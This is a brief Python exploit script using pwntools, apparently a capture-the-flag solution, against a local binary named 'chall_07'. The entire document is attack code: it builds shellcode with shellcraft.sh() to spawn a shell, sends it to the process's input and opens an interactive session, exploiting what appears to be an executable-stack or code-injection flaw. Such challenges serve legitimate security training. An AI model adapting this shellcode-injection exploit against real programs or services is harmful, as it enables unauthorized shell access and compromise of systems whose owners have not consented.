from pwn import *

binary = context.binary = ELF('./chall_07')

p = process('./chall_07')
p.recv()

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
